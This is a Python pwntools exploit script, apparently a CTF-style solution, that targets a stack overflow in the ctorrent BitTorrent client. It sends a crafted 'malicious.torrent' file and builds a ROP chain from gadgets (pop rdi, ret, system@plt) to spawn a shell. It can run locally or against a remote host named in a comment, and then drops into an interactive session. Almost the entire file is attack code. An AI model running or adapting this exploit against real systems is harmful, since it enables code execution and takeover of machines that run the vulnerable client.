# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux','splitw','-h']
context.arch="amd64"
context.log_level="debug"

def debug(addr=-1,PIE=True):
	if addr == -1:
		gdb.attach(p)
	else:
		if PIE:
			text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
			gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
		else:
			gdb.attach(p,"b *{}".format(hex(addr)))


def main(host,port=22355):
	#nc 172.20.5.31 22355
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./ctorrent")
	
	debug(0x4039E3,PIE=False)	# 存在栈溢出漏洞的地址

	p.recvuntil("torrent file >\n")
	#debug(0x4039E3,PIE=False)	

	#fp = open("b.torrent","r").read()
	fp = open("malicious.torrent","r").read()
	fp = fp.replace('\x0a', '\x30')
	# fp=fp.replace('\x11\xf1\xff\xbf\xcc\xfc\xff\xbf','\xf0\x2a\x40\x00\x00\x00\x00\x00')

	poprdi = 0x402c7e
	rett = 0x40A813
	tmp = 0x1188	# padding
	shadr = 0x400f24
	sysplt = 0x4022A0
	
	rop = p64(rett) + p64(poprdi) + p64(shadr) + p64(sysplt) + p64(0) #rett是为了栈对齐
	#fp = fp[:tmp] + rop + fp[tmp + len(rop):]   # rop填入相应位置
	# fp = fp[:tmp] + rop + fp[tmp:]
	
	p.sendline(str((len(fp))))
	p.sendlineafter("file >\n",fp)

	p.interactive()


if __name__ == "__main__":
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	main(args["REMOTE"])